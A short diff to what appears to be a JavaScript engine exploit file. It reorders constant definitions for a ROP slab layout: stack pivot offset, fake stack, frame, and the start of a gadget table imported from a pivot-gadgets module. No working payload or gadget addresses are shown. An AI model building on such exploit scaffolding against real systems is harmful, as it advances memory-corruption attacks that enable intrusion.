@@ -8,11 +8,11 @@ import { PIVOT_ROWS, verifyPivotSet } from "./pivot_gadgets.js";
 export const SYS = { getpid: 20, getuid: 0x18 };
 
 const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
-const STACK_SIZE = 0x800;
-const SLAB_SIZE = OFF_STACK + STACK_SIZE;
 const OFF_STORE = 0;
 const OFF_PIVOT = 0x40;
 const OFF_STACK = 0x100;
+const STACK_SIZE = 0x800;
+const SLAB_SIZE = OFF_STACK + STACK_SIZE;
 const OFF_FRAME = OFF_STACK + STACK_SIZE - 0x40;
 
 const GADGET_TABLE = [
